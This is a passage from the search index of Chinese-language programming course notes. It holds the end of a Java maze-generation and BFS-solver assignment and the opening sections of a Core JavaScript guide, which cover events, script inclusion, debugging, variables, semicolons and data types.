\u83b7\u53d6\u884c\u6570\u3002\n     * @return \u884c\u6570\u3002\n     */\n    public int getNumRows() {\n        return this.numRows;\n    }\n\n    /**\n     * \u83b7\u53d6\u5217\u6570\u3002\n     * @return \u5217\u6570\u3002\n     */\n    public int getNumCols() {\n        return this.numCols;\n    }\n\n    /**\n     * \u68c0\u67e5\u5750\u6807\u662f\u5426\u5728\u8fb9\u754c\u5185\u3002\n     * @param row \u884c\u7d22\u5f15\u3002\n     * @param col \u5217\u7d22\u5f15\u3002\n     * @throws MazeBoundsException \u5982\u679c\u5750\u6807\u65e0\u6548\u3002\n     */\n    private void checkBounds(int row, int col) throws MazeBoundsException {\n        if (row &lt; 0 || row &gt;= this.numRows || col &lt; 0 || col &gt;= this.numCols) {\n            throw new MazeBoundsException(\"\u5750\u6807 (\" + row + \", \" + col + \") \u8d85\u51fa\u8ff7\u5bab\u8fb9\u754c (\u5927\u5c0f: \"\n                                        + this.numRows + \"x\" + this.numCols + \")\");\n        }\n    }\n}\n</code></pre> <p><code>maze/MazeBoundsException.java</code></p> <pre><code>package maze;\n\npublic class MazeBoundsException extends Exception {\n\n    public MazeBoundsException() {\n        super();\n    }\n\n    public MazeBoundsException(String message) {\n        super(message);\n    }\n}\n</code></pre> <ul> <li> <ol> <li>\u751f\u6210\u968f\u673a\u5899\uff0c\u663e\u793a\u8ff7\u5bab\u548c\u89e3\u51b3\u65b9\u6848</li> </ol> </li> </ul> <p><code>RandomMaze.java</code></p> <pre><code>package maze;\n\nimport java.util.Random; // \u5bfc\u5165 Random \u7c7b\n\n/**\n * \u521b\u5efa\u5177\u6709\u968f\u673a\u5899\u58c1\u7684\u8ff7\u5bab\u3002\n */\npublic class RandomMaze extends Maze {\n\n    /**\n     * \u6784\u9020\u51fd\u6570\u3002\n     * @param rows \u884c\u6570 (&gt;0)\u3002\n     * @param cols \u5217\u6570 (&gt;0)\u3002\n     * @param wallProbability \u5899\u58c1\u6982\u7387 ([0.0, 1.0])\u3002\n     */\n    public RandomMaze(int rows, int cols, double wallProbability) {\n        // \u8c03\u7528\u7236\u6784\u9020\u51fd\u6570\u521d\u59cb\u5316\u7f51\u683c\n        super(rows, cols);\n\n        if (wallProbability &lt; 0.0 || wallProbability &gt; 1.0) {\n            throw new IllegalArgumentException(\"\u5899\u58c1\u6982\u7387\u5fc5\u987b\u5728 0.0 \u5230 1.0 \u4e4b\u95f4\");\n        }\n\n        Random rand = new Random(); // \u521b\u5efa Random \u5b9e\u4f8b\n\n        for (int r = 0; r &lt; rows; r++) {\n            for (int c = 0; c &lt; cols; c++) {\n                // \u4f7f\u7528 rand.nextDouble() \u66ff\u4ee3 Math.random()\n                if (rand.nextDouble() &lt; wallProbability) {\n                    try {\n                        // \u8bbe\u7f6e\u5899\u58c1\uff0c\u5904\u7406\u5fc5\u9700\u7684\u5f02\u5e38\n                        setWall(r, c);\n                    } catch (MazeBoundsException e) {\n                        // \u7406\u8bba\u4e0a\u4e0d\u5e94\u53d1\u751f\n                        System.err.println(\"\u5185\u90e8\u9519\u8bef: setWall \u5931\u8d25\u4e8e (\" + r + \",\" + c + \")\");\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}\n</code></pre> <p><code>MathSolver.java</code></p> <pre><code>import maze.*;\nimport java.util.ArrayDeque;\nimport java.util.Queue;\n\n// \u5b58\u50a8\u8ff7\u5bab\u4f4d\u7f6e\nclass MazeLocation {\n    public int row, col;\n    public MazeLocation(int row, int col) {\n        this.row = row;\n        this.col = col;\n    }\n}\n\npublic class MazeSolver {\n\n    public static void main(String[] args) {\n        int rows = 10, cols = 10;\n        double probability = 0.2;\n\n        // \u521b\u5efa\u968f\u673a\u8ff7\u5bab\n        Maze maze = new RandomMaze(rows, cols, probability);\n        System.out.println(\"\u8ff7\u5bab (\" + rows + \"x\" + cols + \", P(\u5899)=\" + probability + \"):\");\n        System.out.println(\"('#'=\u5899, ' '=\u7a7a, 'x'=\u8def\u5f84)\");\n\n        // \u5e7f\u5ea6\u4f18\u5148\u641c\u7d22 (BFS) \u6c42\u89e3\n        MazeLocation[][] parent = new MazeLocation[rows][cols]; // \u5b58\u50a8\u8def\u5f84\u524d\u9a71\n        boolean found = false;\n\n        parent[0][0] = new MazeLocation(-1, -1); // \u6807\u8bb0\u8d77\u70b9\n        Queue&lt;MazeLocation&gt; queue = new ArrayDeque&lt;&gt;();\n        queue.add(new MazeLocation(0, 0));\n\n        int[][] dirs = {{1, 0}, {0, 1}, {-1, 0}, {0, -1}}; // \u56db\u4e2a\u65b9\u5411\n\n        try {\n            while (!queue.isEmpty() &amp;&amp; !found) {\n                MazeLocation loc = queue.remove();\n\n                if (loc.row == rows - 1 &amp;&amp; loc.col == cols - 1) { // \u5230\u8fbe\u7ec8\u70b9\n                    found = true;\n                    break;\n                }\n\n                // \u63a2\u7d22\u90bb\u5c45\n                for (int[] dir : dirs) {\n                    int nextRow = loc.row + dir[0];\n                    int nextCol = loc.col + dir[1];\n\n                    // \u68c0\u67e5\u6709\u6548\u6027\uff1a\u8fb9\u754c\u5185\u3001\u975e\u5899\u3001\u672a\u8bbf\u95ee\n                    if (nextRow &gt;= 0 &amp;&amp; nextRow &lt; rows &amp;&amp; nextCol &gt;= 0 &amp;&amp; nextCol &lt; cols\n                            &amp;&amp; !maze.isWall(nextRow, nextCol)\n                            &amp;&amp; parent[nextRow][nextCol] == null)\n                    {\n                        parent[nextRow][nextCol] = loc; // \u8bb0\u5f55\u524d\u9a71\n                        queue.add(new MazeLocation(nextRow, nextCol)); // \u52a0\u5165\u961f\u5217\n                    }\n                }\n            }\n\n            // \u6253\u5370\u7ed3\u679c\n            boolean[][] path = new boolean[rows][cols];\n\n            if (!found) {\n                System.out.println(\"\\n\u65e0\u89e3\uff01\");\n                // \u4ec5\u6253\u5370\u8ff7\u5bab\u672c\u8eab\n                 for (int r = 0; r &lt; rows; r++) {\n                    for (int c = 0; c &lt; cols; c++) {\n                       if (maze.isWall(r, c)) System.out.print(\"#\");\n                       else System.out.print(\" \");\n                    }\n                    System.out.println();\n                }\n            } else {\n                System.out.println(\"\\n\u627e\u5230\u8def\u5f84\uff01\");\n                // \u56de\u6eaf\u6807\u8bb0\u8def\u5f84\n                MazeLocation curr = new MazeLocation(rows - 1, cols - 1);\n                while (curr.row != -1) { // \u56de\u6eaf\u5230\u8d77\u70b9\u6807\u8bb0\n                    path[curr.row][curr.col] = true;\n                    curr = parent[curr.row][curr.col];\n                }\n\n                // \u6253\u5370\u5e26\u8def\u5f84\u7684\u8ff7\u5bab\n                for (int r = 0; r &lt; rows; r++) {\n                    for (int c = 0; c &lt; cols; c++) {\n                        if (path[r][c]) System.out.print(\"x\");\n                        else if (maze.isWall(r, c)) System.out.print(\"#\");\n                        else System.out.print(\" \");\n                    }\n                    System.out.println();\n                }\n            }\n\n        } catch (MazeBoundsException e) {\n            // \u5904\u7406 isWall \u5f02\u5e38 (\u7406\u8bba\u4e0a\u5e94\u907f\u514d)\n            System.err.println(\"\u8ff7\u5bab\u8fb9\u754c\u9519\u8bef: \" + e.getMessage());\n            e.printStackTrace();\n        }\n    }\n}\n</code></pre>"},{"location":"cs/mern/3403/w4/","title":"4.0 Core JavaScript","text":"<p>\u672c\u6307\u5357\u5bf9 Core JavaScript \u8fdb\u884c\u4e86\u5168\u9762\u6982\u8ff0\uff0c\u65e8\u5728\u901a\u8fc7\u89e3\u91ca\u57fa\u672c\u6982\u5ff5\u3001\u5f3a\u8c03\u8bed\u8a00\u7684\u5173\u952e\u7279\u6027\u548c\u6f5c\u5728\u9677\u9631\uff0c\u6765\u6784\u5efa\u575a\u5b9e\u7684\u57fa\u7840\u3002</p>"},{"location":"cs/mern/3403/w4/#1","title":"1. \u7b80\u4ecb","text":""},{"location":"cs/mern/3403/w4/#11-javascript","title":"1.1 \u4ec0\u4e48\u662f JavaScript\uff1f","text":"<p>\u4e00\u79cd\u9ad8\u7ea7\u7684 high-level\u3001\u52a8\u6001\u7684 dynamic\u3001\u65e0\u7c7b\u578b\u7684 untyped \u548c\u89e3\u91ca\u578b interpreted \u7684\u7f16\u7a0b\u8bed\u8a00\u3002</p> <p>\u5b83\u5df2\u5728 ECMAScript \u8bed\u8a00\u89c4\u8303\u4e2d\u6807\u51c6\u5316\u3002</p> <p>\u4e0e HTML \u548c CSS \u4e00\u8d77\uff0c\u5b83\u662f\u4e07\u7ef4\u7f51 World Wide Web \u5185\u5bb9\u751f\u4ea7\u7684\u4e09\u5927\u57fa\u672c\u6280\u672f\u4e4b\u4e00\u3002HTML \u5b9a\u4e49\u4e86\u7f51\u9875\u7684\u7ed3\u6784 skeleton\uff0cCSS \u5904\u7406\u8868\u793a (\u5916\u89c2)\uff0c\u800c JavaScript \u589e\u52a0\u4e86\u52a8\u6001\u6027\u548c\u4ea4\u4e92\u6027\u3002</p> <p>\u5b83\u662f\u57fa\u4e8e prototype-based \u7684\uff0c\u5177\u6709 first-class functions\uff0c\u4f7f\u5176\u6210\u4e3a\u4e00\u79cd\u591a\u8303\u5f0f\u8bed\u8a00\uff0c\u652f\u6301 object-oriented\u3001imperative \u548c functional \u7f16\u7a0b\u98ce\u683c\u3002\u5b83\u7684\u8bbe\u8ba1\u521d\u8877\u662f\u6613\u4e8e\u5feb\u901f\u7f16\u5199\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5b83\u4e0e Java \u6beb\u65e0\u5173\u7cfb\uff1b\u8fd9\u4e2a\u540d\u5b57\u662f\u5728 Java \u6d41\u884c\u65f6\u7684\u4e00\u4e2a\u8425\u9500\u51b3\u7b56\u3002</p>"},{"location":"cs/mern/3403/w4/#12","title":"1.2 \u7ec4\u6210\u90e8\u5206","text":"<p>\u53ef\u4ee5\u5206\u4e3a\u4e09\u4e2a\u4e3b\u8981\u7ec4\u6210\u90e8\u5206\uff1a</p> <ul> <li>Core JavaScript\uff1a\u8bed\u8a00\u7684\u57fa\u7840\uff0c\u5904\u7406\u6570\u636e\u64cd\u4f5c\u548c\u663e\u793a\u3002\u8fd9\u662f\u672c\u6307\u5357\u7684\u91cd\u70b9\u3002</li> <li>Client-side JavaScript\uff1a\u6d89\u53ca\u652f\u6301\u6d4f\u89c8\u5668\u63a7\u5236\u548c\u7528\u6237\u4ea4\u4e92\u7684\u5bf9\u8c61\uff0c\u5141\u8bb8\u52a8\u6001\u4fee\u6539\u7f51\u9875\u3002\u4f8b\u5982\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u7528\u6237\u8f93\u5165\u66f4\u6539\u6587\u672c\u6216\u4f7f\u56fe\u7247\u51fa\u73b0/\u6d88\u5931\u3002</li> <li>Server-side JavaScript\uff1a\u5305\u542b\u652f\u6301\u5728 Web \u670d\u52a1\u5668\u4e0a\u4f7f\u7528\u7684\u5bf9\u8c61\u3002\u50cf NodeJS \u8fd9\u6837\u7684\u73af\u5883\u5141\u8bb8\u5728\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#13","title":"1.3 \u5728\u524d\u7aef\u7684\u7528\u9014","text":"<p>\u4e3b\u8981\u7528\u4e8e\u524d\u7aef\u4ee5\u5b9e\u73b0\uff1a</p> <ul> <li>\u51cf\u5c11 Server Load\uff1a\u901a\u8fc7\u5c06\u8ba1\u7b97\u63a8\u9001\u5230\u5ba2\u6237\u7aef\u7684\u6d4f\u89c8\u5668\uff0c\u670d\u52a1\u5668\u53ef\u4ee5\u5904\u7406\u66f4\u591a\u7528\u6237\u5e76\u66f4\u597d\u5730\u6269\u5c55\u3002</li> <li>\u63d0\u9ad8 Responsiveness\uff1a\u4e0e\u5c06\u6570\u636e\u53d1\u9001\u5230\u670d\u52a1\u5668\u5e76\u7b49\u5f85\u54cd\u5e94\u76f8\u6bd4\uff0c\u5ba2\u6237\u7aef\u5904\u7406\u63d0\u4f9b\u4e86\u66f4\u5feb\u7684\u53cd\u5e94\u65f6\u95f4\u3002</li> <li>Form Handling \u548c Validation\uff1a\u53ef\u4ee5\u5904\u7406\u8868\u5355\u5e76\u76f4\u63a5\u5728\u6d4f\u89c8\u5668\u4e2d\u9a8c\u8bc1\u7528\u6237\u8f93\u5165\u3002\u6ce8\u610f\uff1a\u5173\u952e\u7684\u9a8c\u8bc1 \u5fc5\u987b \u540c\u65f6\u5728\u670d\u52a1\u5668\u7aef\u8fdb\u884c\uff0c\u56e0\u4e3a\u5ba2\u6237\u7aef\u63a7\u4ef6\u5f88\u5bb9\u6613\u88ab\u7ed5\u8fc7\u3002\u5ba2\u6237\u7aef\u9a8c\u8bc1\u662f\u4e3a\u4e86\u7528\u6237\u4f53\u9a8c\u548c\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u670d\u52a1\u5668\u8bf7\u6c42\uff0c\u800c\u4e0d\u662f\u4e3a\u4e86\u5b89\u5168\u3002</li> <li>Dynamic Page Alteration\uff1a\u53ef\u4ee5\u4e0e\u7f51\u9875\u7684\u5185\u90e8\u6a21\u578b\uff08\u6587\u6863\u5bf9\u8c61\u6a21\u578b - DOM\uff09\u4ea4\u4e92\uff0c\u4ee5\u52a8\u6001\u66f4\u6539\u5176\u5185\u5bb9\u548c\u7ed3\u6784\u3002</li> <li>Complex User Interfaces\uff1a\u5b83\u80fd\u591f\u521b\u5efa\u6bd4\u5355\u72ec\u4f7f\u7528 HTML \u548c CSS \u6240\u80fd\u63d0\u4f9b\u7684\u66f4\u590d\u6742\u7684\u7528\u6237\u754c\u9762\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#14-event-driven-computation","title":"1.4 Event-driven Computation","text":"<p>\u8bb8\u591a\u7a0b\u5e8f\u65e8\u5728\u54cd\u5e94\u7528\u6237\u64cd\u4f5c\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u79f0\u4e3a events\uff0c\u4f8b\u5982\u9f20\u6807\u70b9\u51fb\u6216\u6309\u952e\u3002</p> <p>\u4e3b\u8981\u4efb\u52a1\u901a\u5e38\u662f\u54cd\u5e94\u8fd9\u4e9b events \u5e76\u89e6\u53d1\u76f8\u5e94\u7684\u64cd\u4f5c\u3002</p> <p>\u793a\u4f8b\uff1aHTML \u6309\u94ae\u4e2d\u7684 onclick \u5c5e\u6027\u53ef\u4ee5\u5728\u6309\u94ae\u88ab\u70b9\u51fb\u65f6\u6267\u884c\u4ee3\u7801\u3002</p> <pre><code>&lt;html&gt;&lt;body&gt;&lt;p&gt; Web \u5f00\u53d1\u8005\u7684\u72d7\u8bf4\u4e86\u4ec0\u4e48\uff1f&lt;/p&gt;&lt;button onclick=\"getElementById('demo').innerHTML='Href href!'\"&gt; \u544a\u8bc9\u6211\uff01&lt;/button&gt;&lt;p id=\"demo\"&gt;&lt;p/&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c\u5355\u51fb \"\u544a\u8bc9\u6211\uff01\" \u6309\u94ae\u4f1a\u66f4\u6539 ID \u4e3a \"demo\" \u7684\u6bb5\u843d\u5185\u5bb9\u3002</p>"},{"location":"cs/mern/3403/w4/#2","title":"2. \u6267\u884c\u548c\u5305\u542b","text":""},{"location":"cs/mern/3403/w4/#21-execution-environments","title":"2.1 Execution Environments","text":"<p>\u8fd0\u884c\u6709\u4e24\u4e2a\u4e3b\u8981\u73af\u5883\uff1a</p> <ul> <li>The Browser\uff1a\u6bcf\u4e2a\u73b0\u4ee3 Web \u6d4f\u89c8\u5668\u90fd\u53ef\u4ee5\u6267\u884c\u3002\u8bb8\u591a\u51fd\u6570\u65e8\u5728\u5728 HTML \u5bb9\u5668\u6216\u7a97\u53e3\u4e2d\u5de5\u4f5c\u3002</li> <li>NodeJS\uff1a\u4e00\u4e2a\u670d\u52a1\u5668\u7aef\u73af\u5883\u3002</li> </ul> <p>\u672c\u6307\u5357\u5c06\u4e3b\u8981\u5173\u6ce8\u5728\u6d4f\u89c8\u5668\u4e2d\u6267\u884c\u3002</p>"},{"location":"cs/mern/3403/w4/#22","title":"2.2 \u5728\u7f51\u9875\u4e2d\u5305\u542b","text":"<p>\u6709\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u5c06\u4ee3\u7801\u5305\u542b\u5728 HTML \u9875\u9762\u4e2d\uff1a</p> <ul> <li>Inline in a tag attribute\uff1a\u4ee3\u7801\u53ef\u4ee5\u76f4\u63a5\u653e\u5728 HTML \u6807\u7b7e\u7684\u5c5e\u6027\u4e2d\uff0c\u4f8b\u5982 <code>onclick</code>\u3002</li> </ul> <ul> <li> <p>\u5728\u6587\u6863\u4e3b\u4f53\u4e2d\u4f7f\u7528 <code>&lt;script&gt;</code> \u6807\u7b7e\uff1a\u4ee3\u7801\u53ef\u4ee5\u5d4c\u5165\u5728 <code>&lt;script&gt;</code> \u6807\u7b7e\u5185\uff0c\u901a\u5e38\u653e\u5728 HTML \u6587\u6863\u7684 <code>&lt;head&gt;</code> \u6216 <code>&lt;body&gt;</code> \u4e2d\u3002</p> <pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;script&gt;function myFunction() {\n    document.getElementById(\"demo\").innerHTML = \"\u6bb5\u843d\u5df2\u66f4\u6539\u3002\";\n}&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;\u4e00\u4e2a\u7f51\u9875&lt;/h1&gt;&lt;p id=\"demo\"&gt;\u4e00\u4e2a\u6bb5\u843d&lt;/p&gt;&lt;button type=\"button\" onclick=\"myFunction()\"&gt;\u8bd5\u8bd5\u770b&lt;/button&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre> <p>\u5728\u6b64\u793a\u4f8b\u4e2d\uff0c<code>myFunction</code> \u5728 <code>&lt;head&gt;</code> \u4e2d\u5b9a\u4e49\uff0c\u5e76\u7531\u6309\u94ae\u7684 <code>onclick</code> \u4e8b\u4ef6\u8c03\u7528\u3002</p> </li> </ul> <ul> <li>From an external file\uff1a\u4ee3\u7801\u53ef\u4ee5\u5b58\u50a8\u5728\u4e00\u4e2a\u5355\u72ec\u7684 <code>.js</code> \u6587\u4ef6\u4e2d\uff0c\u5e76\u4f7f\u7528 <code>&lt;script&gt;</code> \u6807\u7b7e\u7684 <code>src</code> \u5c5e\u6027\u8fdb\u884c\u94fe\u63a5\u3002\u8fd9\u662f\u7ec4\u7ec7\u4ee3\u7801\u548c\u4f7f\u7528\u5916\u90e8\u5e93\u7684\u5e38\u89c1\u505a\u6cd5\u3002</li> </ul> <p>\u51fd\u6570\u901a\u5e38\u5e94\u5728\u4f7f\u7528\u524d\u5b9a\u4e49\uff0c\u8fd9\u5c31\u662f\u4e3a\u4ec0\u4e48\u811a\u672c\u901a\u5e38\u653e\u5728 <code>&lt;head&gt;</code> \u4e2d\u6216\u4ece\u5916\u90e8\u94fe\u63a5\u7684\u539f\u56e0\u3002</p>"},{"location":"cs/mern/3403/w4/#23","title":"2.3 \u5728\u6d4f\u89c8\u5668\u4e2d\u8c03\u8bd5","text":"<p>\u9519\u8bef\u901a\u5e38\u7531\u6d4f\u89c8\u5668\u68c0\u6d4b\u548c\u5904\u7406\u3002</p> <p>\u50cf Chrome \u8fd9\u6837\u7684\u6d4f\u89c8\u5668\u63d0\u4f9b\u4e86 developer tools\uff0c\u5177\u6709\u4ee5\u4e0b\u529f\u80fd\uff1a</p> <ul> <li>Console\uff1a\u5141\u8bb8\u4f60\u4e0e\u4ee3\u7801\u548c\u9875\u9762\u4ea4\u4e92\uff0c\u67e5\u770b\u65e5\u5fd7\u6d88\u606f (<code>console.log</code>)\uff0c\u5e76\u67e5\u770b\u9519\u8bef\u6d88\u606f\u3002\u9519\u8bef\u901a\u5e38\u5728\u7f51\u9875\u672c\u8eab\u4e0a\u88ab\u9759\u9ed8\u5904\u7406\uff0c\u4f46\u4f1a\u663e\u793a\u5728\u63a7\u5236\u53f0\u4e2d\u3002</li> <li>Sources Tab\uff1a\u5141\u8bb8\u4f60\u6d4f\u89c8\u4ee3\u7801 (HTML, CSS, JavaScript)\u3002</li> <li>Breakpoints \u548c Debugger\uff1a\u5141\u8bb8\u4f60\u5728\u4ee3\u7801\u4e2d\u8bbe\u7f6e\u65ad\u70b9\uff0c\u5355\u6b65\u6267\u884c\uff0c\u5e76\u68c0\u67e5\u53d8\u91cf\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#24-io","title":"2.4 \u6d4f\u89c8\u5668\u4e2d\u7684\u8f93\u5165/\u8f93\u51fa (I/O)","text":"<p>\u5728\u6d4f\u89c8\u5668\u4e2d\uff0c\u4e3b\u8981\u8f93\u51fa\u662f\u7f51\u9875\uff08HTML canvas\uff09\u672c\u8eab\uff1b\u7ed3\u679c\u901a\u5e38\u901a\u8fc7\u4fee\u6539\u9875\u9762\u5185\u5bb9\u6765\u663e\u793a\u3002</p> <ul> <li><code>console.log()</code>\uff1a\u7528\u4e8e\u901a\u8fc7\u5411\u6d4f\u89c8\u5668\u63a7\u5236\u53f0\u5199\u5165\u6d88\u606f\u6765\u8fdb\u884c\u7b80\u5355\u8c03\u8bd5\u3002\u73b0\u5728\u8ba4\u4e3a\u5c06\u5927\u91cf\u65e5\u5fd7\u6216\u9519\u8bef\u6d88\u606f\u76f4\u63a5\u5199\u5165 document object \u662f\u4e0d\u597d\u7684\u505a\u6cd5\u3002</li> <li><code>alert()</code>\uff1a\u5411\u7528\u6237\u663e\u793a\u4e00\u4e2a\u7b80\u5355\u7684\u5f39\u51fa\u6d88\u606f\u6846\u3002</li> <li><code>confirm()</code>\uff1a\u663e\u793a\u4e00\u4e2a\u5e26\u6709\u201c\u786e\u5b9a\u201d\u548c\u201c\u53d6\u6d88\u201d\u6309\u94ae\u7684\u5f39\u51fa\u6846\uff0c\u5141\u8bb8\u7528\u6237\u8fdb\u884c\u5e03\u5c14\u54cd\u5e94\u3002</li> <li><code>prompt()</code>\uff1a\u663e\u793a\u4e00\u4e2a\u63d0\u793a\u7528\u6237\u8f93\u5165\u7684\u5f39\u51fa\u6846\u3002</li> </ul> <p>\u8fd9\u4e9b I/O \u65b9\u6cd5\uff08<code>alert</code>\u3001<code>confirm</code>\u3001<code>prompt</code>\uff09\u901a\u5e38\u7528\u4e8e\u5feb\u901f\u539f\u578b\u5236\u4f5c\uff0c\u800c\u4e0d\u662f\u7528\u4e8e\u6700\u7ec8\u7684\u751f\u4ea7\u7f51\u7ad9\uff0c\u5728\u751f\u4ea7\u7f51\u7ad9\u4e2d\uff0c\u66f4\u503e\u5411\u4e8e\u4f7f\u7528\u8868\u5355\u548c\u6309\u94ae\u7b49 HTML \u5143\u7d20\u8fdb\u884c\u7528\u6237\u4ea4\u4e92\u3002</p>"},{"location":"cs/mern/3403/w4/#3-core-javascript","title":"3. Core JavaScript \u57fa\u7840","text":"<p>\u672c\u8282\u5bf9 Core JavaScript \u8fdb\u884c\u201c\u65cb\u98ce\u5f0f\u6e38\u89c8\u201d\uff0c\u91cd\u70b9\u4ecb\u7ecd\u5176\u7279\u6027\u4ee5\u53ca\u4e0e Python \u548c Java \u7b49\u8bed\u8a00\u7684\u5dee\u5f02\u3002</p>"},{"location":"cs/mern/3403/w4/#31-variables","title":"3.1 Variables","text":"<ul> <li>Naming Rules\uff1a\u5fc5\u987b\u4ee5\u5b57\u6bcd\u3001\u7f8e\u5143\u7b26\u53f7 ($) \u6216\u4e0b\u5212\u7ebf (_) \u5f00\u5934\u3002\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528\u5b57\u6bcd\u3001\u6570\u5b57\u3001\u7f8e\u5143\u7b26\u53f7\u6216\u4e0b\u5212\u7ebf\u3002</li> </ul> <ul> <li>Case-sensitive\u3002</li> </ul> <ul> <li>\u4e60\u60ef\u4e0a\u4f7f\u7528 camelCase \u4e66\u5199\uff08\u4f8b\u5982\uff0c<code>myVariableName</code>\uff09\uff0c\u8fd9\u4e0d\u540c\u4e8e Python \u7684 snake_case\uff0c\u4f46\u4e0e Java \u7684\u7ea6\u5b9a\u7c7b\u4f3c\u3002</li> </ul> <ul> <li>Assignment\uff1a\u4f7f\u7528\u6807\u51c6\u7684\u7b49\u53f7 (=) \u7b26\u53f7\u3002</li> </ul> <ul> <li> <p>Declaration Keywords\uff1a\u63d0\u4f9b\u4e86\u56db\u79cd\u58f0\u660e\u53d8\u91cf\u7684\u65b9\u5f0f\uff1a</p> <ul> <li><code>let</code>\uff1a\u63a8\u8350\u7684\u9ed8\u8ba4\u5173\u952e\u5b57\u3002</li> <li><code>const</code>\uff1a\u7528\u4e8e\u503c\u4e0d\u80fd\u88ab\u91cd\u65b0\u8d4b\u503c\u7684\u5e38\u91cf\u3002</li> <li><code>var</code>\uff1a\u5177\u6709\u4e0d\u540c\u4f5c\u7528\u57df\u89c4\u5219\u7684\u65e7\u5173\u952e\u5b57\u3002</li> <li>\u65e0\u5173\u952e\u5b57 Undeclared\uff1a\u521b\u5efa global variable\uff1b\u901a\u5e38\u4e0d\u9f13\u52b1\u3002</li> </ul> <pre><code>let z = x + y;\nconst x = 6;\nvar stopFlag = true;\nzz = z; // \u672a\u58f0\u660e (\u6210\u4e3a\u5168\u5c40\u53d8\u91cf)\n</code></pre> </li> </ul> <ul> <li> <p>Multiple Declarations\uff1a\u53ef\u4ee5\u5728\u540c\u4e00\u884c\u58f0\u660e\u591a\u4e2a\u53d8\u91cf\u3002</p> <pre><code>let counter, index, pi = 3.14159265, rover = \"Palmer\";\n</code></pre> <p>\uff08\u6807\u51c6\u7684\u884c\u4e3a\u662f\u53ea\u6709 <code>pi</code> \u4f1a\u88ab\u521d\u59cb\u5316\u4e3a 3.14159265\uff1b<code>counter</code> \u548c <code>index</code> \u5c06\u662f undefined\u3002\uff09</p> </li> </ul>"},{"location":"cs/mern/3403/w4/#32-keywords","title":"3.2 Keywords","text":"<p>\u67d0\u4e9b\u8bcd\u662f\u4fdd\u7559\u7684\uff0c\u4e0d\u80fd\u7528\u4f5c\u53d8\u91cf\u540d\u3002</p>"},{"location":"cs/mern/3403/w4/#33-syntax-error-tolerance","title":"3.3 Syntax \u548c Error Tolerance","text":"<ul> <li> <p>Comments\uff1a</p> <ul> <li>\u5355\u884c\u6ce8\u91ca\uff1a<code>//</code></li> <li>\u591a\u884c\u6ce8\u91ca\uff1a<code>/* ... */</code></li> </ul> </li> </ul> <ul> <li> <p>Semicolons - ;\uff1a\u8bed\u53e5 \u5e94\u8be5 \u4ee5\u5206\u53f7\u7ed3\u675f\u3002</p> <p>\u7136\u800c\uff0c\u5982\u679c\u5206\u53f7\u7f3a\u5931\u4e14\u8bed\u53e5\u770b\u8d77\u6765\u5b8c\u6574\uff0c\u89e3\u91ca\u5668\u4f1a\u5c1d\u8bd5\u81ea\u52a8\u63d2\u5165\u5206\u53f7\uff08\u81ea\u52a8\u5206\u53f7\u63d2\u5165 - ASI\uff09\u3002</p> </li> </ul> <ul> <li> <p>Banana Skin\uff1aASI \u53ef\u80fd\u5bfc\u81f4\u610f\u5916\u884c\u4e3a\u548c\u9519\u8bef\uff0c\u4f7f\u8c03\u8bd5\u53d8\u5f97\u56f0\u96be\u3002\u4f8b\u5982\uff1a</p> <pre><code>return  // ASI \u5728\u6b64\u63d2\u5165\u5206\u53f7\uff1areturn;\nx;      // \u8fd9\u53d8\u6210\u4e86\u4e00\u6761\u4e0d\u53ef\u8fbe\u7684\u8bed\u53e5\uff1ax;\n</code></pre> <p>\u8fd9\u5b9e\u9645\u4e0a\u4f1a\u8fd4\u56de undefined \u800c\u4e0d\u662f <code>x</code>\u3002</p> </li> </ul> <ul> <li>Error Handling Philosophy\uff1a\u88ab\u8bbe\u8ba1\u6210\u975e\u5e38\u201c\u5065\u58ee\u201d\u4e14\u80fd\u5bb9\u5fcd\u9519\u8bef\u3002\u5b83\u901a\u5e38\u4f1a\u5c1d\u8bd5\u201c\u731c\u6d4b\u201d\u7a0b\u5e8f\u5458\u7684\u610f\u56fe\u5e76\u7ee7\u7eed\u6267\u884c\uff0c\u800c\u4e0d\u662f\u505c\u6b62\u3002\u8fd9\u53ef\u80fd\u4f7f\u8c03\u8bd5\u5177\u6709\u6311\u6218\u6027\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#34-primitives-objects","title":"3.4 Primitives \u548c Objects","text":"<p>\u533a\u5206\u539f\u59cb\u6570\u636e\u7c7b\u578b\u548c\u5bf9\u8c61\uff1a</p> <ul> <li> <p>Primitive Data Types\uff1a\u8fd9\u4e9b\u662f\u76f4\u63a5\u5b58\u50a8\u7684\u4e0d\u53ef\u53d8\u503c\uff08\u901a\u5e38\u5728 stack \u4e0a\uff09\u3002\u4e3b\u8981\u7684 primitives \u662f\uff1a</p> <ul> <li><code>Number</code></li> </ul> <ul> <li><code>String</code></li> </ul> <ul> <li><code>Boolean</code></li> </ul> <ul> <li><code>null</code></li> </ul> <ul> <li> <p>undefined</p> <p>\uff08ES6 \u5f15\u5165\u4e86 Symbol\uff0c\u540e\u6765\u53c8\u6dfb\u52a0\u4e86 BigInt\u3002\uff09</p> </li> </ul> </li> </ul> <ul> <li> <p>Objects\uff1a\u5982\u679c\u4e00\u4e2a\u503c\u4e0d\u662f primitive\uff0c\u5b83\u5c31\u662f\u4e00\u4e2a object\u3002\u8fd9\u5305\u62ec\uff1a</p> <ul> <li><code>Function</code></li> </ul> <ul> <li><code>Array</code></li> </ul> <ul> <li><code>Date</code></li> </ul> <ul> <li> <p>Math \u7b49\u3002</p> <p>Objects \u4f5c\u4e3a\u5bf9\u5185\u5b58\uff08heap\uff09\u4e2d\u5b58\u50a8\u5176\u5c5e\u6027\u7684\u4f4d\u7f6e\u7684 reference \u6216 pointer \u5b58\u50a8\u3002</p> </li> </ul> </li> </ul> <ul> <li>Object 